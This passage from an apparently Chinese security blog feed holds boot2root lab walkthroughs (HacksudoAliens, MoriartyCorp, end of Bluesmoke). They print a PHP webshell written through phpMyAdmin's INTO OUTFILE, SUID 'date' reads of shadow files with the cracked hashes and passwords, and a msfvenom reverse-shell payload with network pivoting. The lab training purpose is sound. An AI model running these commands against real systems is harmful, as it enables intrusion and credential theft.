30 30 30 20 30 30 31  |011 00100000 001|</span><br><span class="line">00000270  31 30 31 30 30 20 30 31 31 30 30 30 31 30 20 30  |10100 01100010 0|</span><br><span class="line">00000280  30 31 30 30 30 30 30 20 30 30 31 31 30 31 30 30  |0100000 00110100|</span><br><span class="line">00000290  20 30 31 31 30 30 30 30 31 20 30 30 31 30 30 30  | 01100001 001000|</span><br><span class="line">000002a0  30 30 20 30 30 31 31 30 31 30 31 20 30 30 31 31  |00 00110101 0011|</span><br><span class="line">000002b0  30 31 31 30 20 30 30 31 30 30 30 30 30 20 30 30  |0110 00100000 00|</span><br><span class="line">000002c0  31 31 30 31 30 30 20 30 31 31 30 30 30 31 30 20  |110100 01100010 |</span><br><span class="line">000002d0  30 30 31 30 30 30 30 30 20 30 30 31 31 30 31 30  |00100000 0011010|</span><br><span class="line">000002e0  30 20 30 30 31 31 30 31 31 30 20 30 30 31 30 30  |0 00110110 00100|</span><br><span class="line">000002f0  30 30 30 20 30 30 31 31 30 31 30 31 20 30 30 31  |000 00110101 001|</span><br><span class="line">00000300  31 30 30 30 31 20 30 30 31 30 30 30 30 30 20 30  |10001 00100000 0|</span><br><span class="line">00000310  30 31 31 30 31 30 31 20 30 30 31 31 30 30 31 31  |0110101 00110011|</span><br><span class="line">00000320  20 30 30 31 30 30 30 30 30 20 30 30 31 31 30 31  | 00100000 001101|</span><br><span class="line">00000330  30 30 20 30 31 31 30 30 30 30 31 20 30 30 31 30  |00 01100001 0010|</span><br><span class="line">00000340  30 30 30 30 20 30 30 31 31 30 31 30 31 20 30 30  |0000 00110101 00|</span><br><span class="line">00000350  31 31 31 30 30 31 20 30 30 31 30 30 30 30 30 20  |111001 00100000 |</span><br><span class="line">00000360  30 30 31 31 30 31 30 30 20 30 31 31 30 30 30 31  |00110100 0110001|</span><br><span class="line">00000370  31 20 30 30 31 30 30 30 30 30 20 30 30 31 31 30  |1 00100000 00110|</span><br><span class="line">00000380  31 30 30 20 30 30 31 31 30 30 31 30 20 30 30 31  |100 00110010 001|</span><br><span class="line">00000390  30 30 30 30 30 20 30 30 31 31 30 31 30 30 20 30  |00000 00110100 0|</span><br><span class="line">000003a0  30 31 31 30 31 30 30 20 30 30 31 30 30 30 30 30  |0110100 00100000|</span><br><span class="line">000003b0  20 30 30 31 31 30 31 30 30 20 30 30 31 31 31 30  | 00110100 001110|</span><br><span class="line">000003c0  30 30 20 30 30 31 30 30 30 30 30 20 30 30 31 31  |00 00100000 0011|</span><br><span class="line">000003d0  30 31 30 30 20 30 30 31 31 31 30 30 31 20 30 30  |0100 00111001 00|</span><br><span class="line">000003e0  31 30 30 30 30 30 20 30 30 31 31 30 30 31 31 20  |100000 00110011 |</span><br><span class="line">000003f0  30 30 31 31 30 31 30 31 20 30 30 31 30 30 30 30  |00110101 0010000|</span><br><span class="line">00000400  30 20 30 30 31 31 30 31 30 30 20 30 31 31 30 30  |0 00110100 01100|</span><br><span class="line">00000410  30 31 30 20 30 30 31 30 30 30 30 30 20 30 30 31  |010 00100000 001|</span><br><span class="line">00000420  31 30 31 30 31 20 30 30 31 31 31 30 30 31 20 30  |10101 00111001 0|</span><br><span class="line">00000430  30 31 30 30 30 30 30 20 30 30 31 31 30 31 30 30  |0100000 00110100|</span><br><span class="line">00000440  20 30 31 31 30 30 30 31 30 20 30 30 31 30 30 30  | 01100010 001000|</span><br><span class="line">00000450  30 30 20 30 30 31 31 30 30 31 31 20 30 30 31 31  |00 00110011 0011|</span><br><span class="line">00000460  30 31 30 31 20 30 30 31 30 30 30 30 30 20 30 30  |0101 00100000 00|</span><br><span class="line">00000470  31 31 30 31 30 30 20 30 30 31 31 30 30 31 30 20  |110100 00110010 |</span><br><span class="line">00000480  30 30 31 30 30 30 30 30 20 30 30 31 31 30 31 30  |00100000 0011010|</span><br><span class="line">00000490  30 20 30 30 31 31 30 31 30 31 20 30 30 31 30 30  |0 00110101 00100|</span><br><span class="line">000004a0  30 30 30 20 30 30 31 31 30 30 31 31 20 30 30 31  |000 00110011 001|</span><br><span class="line">000004b0  31 30 31 31 30 20 30 30 31 30 30 30 30 30 20 30  |10110 00100000 0|</span><br><span class="line">000004c0  30 31 31 30 31 30 31 20 30 30 31 31 30 31 31 31  |0110101 00110111|</span><br><span class="line">000004d0  20 30 30 31 30 30 30 30 30 20 30 30 31 31 30 31  | 00100000 001101|</span><br><span class="line">000004e0  30 30 20 30 30 31 31 30 30 31 31 20 30 30 31 30  |00 00110011 0010|</span><br><span class="line">000004f0  30 30 30 30 20 30 30 31 31 30 31 30 31 20 30 30  |0000 00110101 00|</span><br><span class="line">00000500  31 31 30 31 31 30 20 30 30 31 30 30 30 30 30 20  |110110 00100000 |</span><br><span class="line">00000510  30 30 31 31 30 31 30 30 20 30 31 31 30 30 31 31  |00110100 0110011|</span><br><span class="line">00000520  30 20 30 30 31 30 30 30 30 30 20 30 30 31 31 30  |0 00100000 00110|</span><br><span class="line">00000530  31 30 31 20 30 30 31 31 30 30 31 30 20 30 30 31  |101 00110010 001|</span><br><span class="line">00000540  30 30 30 30 30 20 30 30 31 31 30 30 31 31 20 30  |00000 00110011 0|</span><br><span class="line">00000550  30 31 31 30 31 30 30 20 30 30 31 30 30 30 30 30  |0110100 00100000|</span><br><span class="line">00000560  20 30 30 31 31 30 31 30 30 20 30 30 31 31 30 30  | 00110100 001100|</span><br><span class="line">00000570  30 31 20 30 30 31 30 30 30 30 30 20 30 30 31 31  |01 00100000 0011|</span><br><span class="line">00000580  30 30 31 31 20 30 31 31 30 30 31 30 30 20 30 30  |0011 01100100 00|</span><br><span class="line">00000590  31 30 30 30 30 30 20 30 30 31 31 30 30 31 31 20  |100000 00110011 |</span><br><span class="line">000005a0  30 31 31 30 30 31 30 30 20 30 30 31 30 30 30 30  |01100100 0010000|</span><br><span class="line">000005b0  30 20 30 30 31 31 30 30 31 31 20 30 31 31 30 30  |0 00110011 01100|</span><br><span class="line">000005c0  31 30 30 20 30 30 31 30 30 30 30 30 20 30 30 31  |100 00100000 001|</span><br><span class="line">000005d0  31 30 30 31 31 20 30 31 31 30 30 31 30 30        |10011 01100100|</span><br></pre></td></tr></table></figure>

<p><img data-src="./Bluesmoke/20.png" alt></p>
<ul>
<li>获得  root / -!F8h2LMr&lt;[n]`N]Kq</li>
</ul>
<p><img data-src="./Bluesmoke/21.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>other</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>Bluesmoke</tag>
      </tags>
  </entry>
  <entry>
    <title>HacksudoAliens</title>
    <url>/2021/04/24/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/HacksudoAliens/</url>
    <content><![CDATA[<h1 id="HacksudoAliens"><a href="#HacksudoAliens" class="headerlink" title="HacksudoAliens"></a>HacksudoAliens</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>HacksudoAliens</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    ce:98:ba:98:c4:97       (Unknown: locally administered)</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line">192.168.43.203  08:00:27:a9:56:06       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.018 seconds (126.86 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.203</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.203</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.43.203</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-24 06:16 EDT</span><br><span class="line">Nmap scan report for 192.168.43.203</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 31:d8:56:f4:cf:8b:09:e8:a1:5e:2e:dd:ac:08:6b:dd (RSA)</span><br><span class="line">|   256 cd:65:ec:9e:d0:2c:6b:4e:02:40:c3:fd:01:5d:d1:87 (ECDSA)</span><br><span class="line">|_  256 03:00:28:0e:0b:da:12:68:c3:c5:45:ab:bb:92:92:fa (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Hacksudo Alien?</span><br><span class="line">9000/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: phpMyAdmin</span><br><span class="line">MAC Address: 08:00:27:A9:56:06 (Oracle VirtualBox virtual NIC)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=4/24%OT=22%CT=1%CU=42581%PV=Y%DS=1%DC=D%G=Y%M=080027%T</span><br><span class="line">OS:M=6083F01B%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%II=I</span><br><span class="line">OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O</span><br><span class="line">OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6</span><br><span class="line">OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O</span><br><span class="line">OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=</span><br><span class="line">OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%</span><br><span class="line">OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(</span><br><span class="line">OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=</span><br><span class="line">OS:N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.44 ms 192.168.43.203</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 26.41 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./HacksudoAliens/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.203/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# gobuster dir -u http://192.168.43.203/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.43.203/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,txt,php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/24 06:17:02 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/images (Status: 301)</span><br><span class="line">/game.html (Status: 200)</span><br><span class="line">/backup (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/24 06:19:22 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./HacksudoAliens/2.png" alt></p>
<p><a href="http://192.168.43.203:9000/" target="_blank" rel="noopener">http://192.168.43.203:9000/</a></p>
<p><img data-src="./HacksudoAliens/3.png" alt></p>
<h3 id="备份文件"><a href="#备份文件" class="headerlink" title="备份文件"></a>备份文件</h3><p><img data-src="./HacksudoAliens/4.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Specify <span class="built_in">which</span> database is to be backed up</span></span><br><span class="line">db_name=""</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Set the website <span class="built_in">which</span> this database relates to</span></span><br><span class="line">website="localhost"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Database credentials</span></span><br><span class="line">user="vishal"</span><br><span class="line">password="hacksudo"</span><br><span class="line">host="localhost"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> How many days would you like to keep files <span class="keyword">for</span>?</span></span><br><span class="line">days="30"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#####################################################</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### EDITING BELOW MAY CAUSE UNEXPECTED RESULTS #####</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#####################################################</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Set the date</span></span><br><span class="line">date=$(date +"%Y%m%d-%H%M")</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Set the location of <span class="built_in">where</span> backups will be stored</span></span><br><span class="line">backup_location="/var/backups/mysql"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Create the directory <span class="keyword">for</span> the website <span class="keyword">if</span> it doesn<span class="string">'t already exist</span></span></span><br><span class="line">mkdir -p $&#123;backup_location&#125;/$&#123;website&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> Append the database name with the date to the backup location</span></span><br><span class="line">backup_full_name="$&#123;backup_location&#125;/$&#123;website&#125;/$&#123;db_name&#125;-$&#123;date&#125;.sql"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Set default file permissions</span></span><br><span class="line">umask 177</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Dump database into SQL file</span></span><br><span class="line">mysqldump --lock-tables --user=$user --password=$password --host=$host $db_name &gt; $backup_full_name</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Set a value to be used to find all backups with the same name</span></span><br><span class="line">find_backup_name="$&#123;backup_location&#125;/$&#123;website&#125;/$&#123;db_name&#125;-*.sql"</span><br><span class="line"><span class="meta">#</span><span class="bash"> Delete files older than the number of days defined</span></span><br><span class="line">find $find_backup_name -mtime +$days -type f -delete</span><br></pre></td></tr></table></figure>

<p>发现账号密码 <code>vishal / hacksudo</code></p>
<h3 id="登入phpmyadmin-拿到webshell"><a href="#登入phpmyadmin-拿到webshell" class="headerlink" title="登入phpmyadmin,拿到webshell"></a>登入phpmyadmin,拿到webshell</h3><p><img data-src="./HacksudoAliens/5.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT &quot;&lt;HTML&gt;&lt;BODY&gt;&lt;FORM METHOD&#x3D;\&quot;GET\&quot; NAME&#x3D;\&quot;myform\&quot; ACTION&#x3D;\&quot;\&quot;&gt;&lt;INPUT TYPE&#x3D;\&quot;text\&quot; NAME&#x3D;\&quot;cmd\&quot;&gt;&lt;INPUT TYPE&#x3D;\&quot;submit\&quot; VALUE&#x3D;\&quot;Send\&quot;&gt;&lt;&#x2F;FORM&gt;&lt;pre&gt;&lt;?php if($_GET[&#39;cmd&#39;]) &#123; $res &#x3D; system($_GET[\&#39;cmd\&#39;]); echo $res; &#125; ?&gt; &lt;&#x2F;pre&gt;&lt;&#x2F;BODY&gt;&lt;&#x2F;HTML&gt;&quot;</span><br><span class="line">INTO OUTFILE &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;cmd.php&#39;</span><br></pre></td></tr></table></figure>

<p><img data-src="./HacksudoAliens/6.png" alt></p>
<p><img data-src="./HacksudoAliens/7.png" alt></p>
<p><img data-src="./HacksudoAliens/8.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><ul>
<li>SUID</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img data-src="./HacksudoAliens/9.png" alt></p>
<ul>
<li>date suid 可越权任意文件读取</li>
<li>又发现如下敏感文件</li>
</ul>
<p><img data-src="./HacksudoAliens/10.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">LFILE=file_to_read</span><br><span class="line">date -f $LFILE</span><br><span class="line"></span><br><span class="line">LFILE=passwd.bak</span><br><span class="line">date -f $LFILE</span><br><span class="line"></span><br><span class="line">LFILE=shadow.bak</span><br><span class="line">date -f $LFILE</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">hacksudo:x:1000:1000:hacksudo,,,:/home/hacksudo:/bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash"> shadow</span></span><br><span class="line">root:$6$N6p.dpWhPYXSXC9U$8EraUiQ5DtMF5ov2ZbnY8DoLK1liRukqhTnTTK67MQ.tgpglkVX/I9P1aYjNeO/cwjQk9lJ/ABd9YLTMeMSn3/:18721:0:99999:7:::</span><br><span class="line">hacksudo:$6$cOv4E/VKAe0EVwV4$YScCx10zfi7g4aiLY.qo8QPm2iOogJea41mk2rGk/0JM5AtnrmiyTN5ctNJ0KTLS5Iru4lHWYPug792u3L/Um1:18721:0:99999:7:::</span><br></pre></td></tr></table></figure>

<ul>
<li>join破解密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unshadow passwd.txt shadow.txt &gt; unshadowed.txt</span><br><span class="line"></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt</span><br></pre></td></tr></table></figure>

<p><img data-src="./HacksudoAliens/11.png" alt></p>
<p>拿到 hacksudo shell <code>hacksudo / aliens</code></p>
<p><img data-src="./HacksudoAliens/12.png" alt></p>
<ul>
<li>最后一步</li>
</ul>
<p><img data-src="./HacksudoAliens/13.png" alt></p>
<p><img data-src="./HacksudoAliens/14.png" alt></p>
<p><img data-src="./HacksudoAliens/15.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hacksudo</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>hacksudo</tag>
      </tags>
  </entry>
  <entry>
    <title>MoriartyCorp</title>
    <url>/2023/01/15/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/MoriartyCorp/</url>
    <content><![CDATA[<h1 id="MoriartyCorp"><a href="#MoriartyCorp" class="headerlink" title="MoriartyCorp"></a>MoriartyCorp</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>MoriartyCorp</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:33:c7:0e, IPv4: 192.168.1.237</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.98    00:22:6d:62:86:81       Shenzhen GIEC Electronics Co., Ltd.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.163   a4:50:46:78:16:9f       Xiaomi Communications Co Ltd</span><br><span class="line">192.168.1.199   08:00:27:38:31:1f       PCS Systemtechnik GmbH</span><br><span class="line">192.168.1.215   c0:e7:3e:b0:0b:5b       (Unknown)</span><br><span class="line">192.168.1.228   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.229   08:00:27:76:08:69       PCS Systemtechnik GmbH</span><br><span class="line">192.168.1.180   00:e0:70:d9:ab:16       DH TECHNOLOGY</span><br><span class="line">192.168.1.111   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd. (DUP: 1)</span><br><span class="line"></span><br><span class="line">10 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.963 seconds (130.41 hosts/sec). 10 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.229</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.229</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; nmap -sV -A -p 1-65535 192.168.1.229                                                                                                                                    130 ⨯</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-05 01:14 EDT</span><br><span class="line">Nmap scan report for evil.lan (192.168.1.229)</span><br><span class="line">Host is up (0.00055s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 5a:a7:c8:64:2a:54:bc:64:48:16:2b:79:64:69:cc:45 (RSA)</span><br><span class="line">|   256 89:8d:6a:9b:44:e3:f1:f1:ef:8c:23:13:7a:84:fc:71 (ECDSA)</span><br><span class="line">|_  256 1d:e6:68:27:52:5b:6d:0d:67:5d:30:4c:03:68:b3:2a (ED25519)</span><br><span class="line">8000/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15rc1)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html; charset=utf-8).</span><br><span class="line">9000/tcp open  http    Portainer Docker UI 1.19.2</span><br><span class="line">|_http-title: Portainer</span><br><span class="line">MAC Address: 08:00:27:76:08:69 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.55 ms evil.lan (192.168.1.229)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.80 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.116:5000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">not important</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./MoriartyCorp/1.png" alt></p>
<ul>
<li>右键查看源代码</li>
</ul>
<p><img data-src="./MoriartyCorp/2.png" alt></p>
<ul>
<li>获得第一个<code>flag / flag{start}</code></li>
</ul>
<h3 id="开启80端口-amp-amp-文件包含"><a href="#开启80端口-amp-amp-文件包含" class="headerlink" title="开启80端口&amp;&amp;文件包含"></a>开启80端口&amp;&amp;文件包含</h3><p><img data-src="./MoriartyCorp/3.png" alt></p>
<p><img data-src="./MoriartyCorp/4.png" alt></p>
<p><img data-src="./MoriartyCorp/5.png" alt></p>
<p><img data-src="./MoriartyCorp/6.png" alt></p>
<ul>
<li>存在文件包含</li>
</ul>
<p><img data-src="./MoriartyCorp/7.png" alt></p>
<ul>
<li>发现远程包含</li>
</ul>
<p><img data-src="./MoriartyCorp/8.png" alt></p>
<ul>
<li>拿<code>shell</code>,获得第二个<code>flag</code></li>
</ul>
<p><img data-src="./MoriartyCorp/9.png" alt></p>
<ul>
<li>提交 flag{the_game_is_on}</li>
</ul>
<p><img data-src="./MoriartyCorp/10.png" alt></p>
<ul>
<li>提示存在内网环境</li>
</ul>
<h3 id="内网测试"><a href="#内网测试" class="headerlink" title="内网测试"></a>内网测试</h3><ul>
<li>msf生成监听 &amp;&amp; 生成linux马</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.6.106 LPORT=8888 -f elf &gt; 1.elf</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.6.106</span><br><span class="line">set lport 8888</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img data-src="./MoriartyCorp/11.png" alt></p>
<p><img data-src="./MoriartyCorp/12.png" alt></p>
<p><img data-src="./MoriartyCorp/13.png" alt></p>
<ul>
<li>添加路由&amp;&amp;设置代理</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run autoroute -s 172.17.0.0/24</span><br></pre></td></tr></table></figure>

<p><img data-src="./MoriartyCorp/14.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img data-src="./MoriartyCorp/15.png" alt></p>
<ul>
<li>扫描内网</li>
</ul>
<p><img data-src="./MoriartyCorp/16.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains nmap 172.17.0.0/24 -sV  -sT  -Pn  -T4 -p80</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">find http://172.17.0.3/ http://172.17.0.4/ http://172.17.0.5/</span><br></pre></td></tr></table></figure>

<ul>
<li>172.17.0.4</li>
</ul>
<p>windows进行代理配置后</p>
<p><img data-src="./MoriartyCorp/17.png" alt></p>
<p>访问主页发现上传文件功能</p>
<p><img data-src="./MoriartyCorp/18.png" alt></p>
<p>其中密码为password弱口令</p>
<p>可以上传恶意php文件</p>
<p><img data-src="./MoriartyCorp/19.png" alt></p>
